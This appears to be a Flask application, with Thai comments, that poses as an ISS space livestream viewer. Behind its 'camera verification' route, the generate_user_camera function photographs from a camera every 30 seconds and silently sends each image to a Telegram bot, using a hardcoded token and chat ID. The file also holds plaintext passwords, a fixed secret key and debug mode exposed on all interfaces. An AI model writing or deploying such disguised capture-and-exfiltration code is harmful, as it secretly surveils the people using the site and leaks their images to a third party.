import cv2
import requests
from flask import Flask, render_template, Response, request, redirect, url_for, session
import os
from datetime import datetime
import uuid

app = Flask(__name__)
app.secret_key = 'test_secret_key_123'  # สำหรับทดสอบ

# ตั้งค่าสตรีมอวกาศ (ทดลองใช้สตรีม ISS ของ NASA)
SPACE_STREAM_URL = "http://isslive.com/video/live.asf"

# ตั้งค่า Telegram Bot (ใช้ค่าที่คุณให้มา)
TELEGRAM_BOT_TOKEN = '7819014286:AAECmM6-QjOYAXraDynowG-morHswzWtIUM'
TELEGRAM_CHAT_ID = '-4973238132'

# ข้อมูลผู้ใช้ทดสอบ
USERS = {
    'testuser': 'testpass123',
    'spaceadmin': 'admin456'
}

def generate_space_stream():
    """สร้างสตรีมวิดีโอจากอวกาศ"""
    cam = cv2.VideoCapture(SPACE_STREAM_URL)
    while True:
        success, frame = cam.read()
        if not success:
            # หากสตรีมไม่ได้ ให้ใช้ภาพสำรอง
            frame = cv2.imread('static/space_backup.jpg') if os.path.exists('static/space_backup.jpg') else None
            if frame is None:
                continue
        ret, buffer = cv2.imencode('.jpg', frame)
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')

def generate_user_camera():
    """สร้างสตรีมจากกล้องผู้ใช้และบันทึกรูป"""
    cam = cv2.VideoCapture(0)
    while True:
        success, frame = cam.read()
        if success:
            # บันทึกรูปทุก 30 วินาที
            if 'last_capture' not in session or (datetime.now() - session['last_capture']).seconds >= 30:
                filename = f"captures/user_{session.get('username', 'unknown')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                cv2.imwrite(filename, frame)
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                        files={'photo': open(filename, 'rb')},
                        data={'chat_id': TELEGRAM_CHAT_ID}
                    )
                except Exception as e:
                    print(f"Error sending to Telegram: {e}")
                session['last_capture'] = datetime.now()
            ret, buffer = cv2.imencode('.jpg', frame)
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')

@app.route('/')
def home():
    if 'username' in session:
        return redirect(url_for('space_stream'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in USERS and USERS[username] == password:
            session['username'] = username
            return redirect(url_for('verify_camera'))
        return "เข้าสู่ระบบล้มเหลว", 401
    return render_template('login.html')

@app.route('/verify_camera')
def verify_camera():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('verify_camera.html')

@app.route('/video_feed')
def video_feed():
    if 'username' not in session:
        return redirect(url_for('login'))
    return Response(generate_user_camera(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/space_stream')
def space_stream():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('space_stream.html')

@app.route('/space_video_feed')
def space_video_feed():
    if 'username' not in session:
        return redirect(url_for('login'))
    return Response(generate_space_stream(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    os.makedirs('captures', exist_ok=True)
    app.run(host='0.0.0.0', port=5000, debug=True)
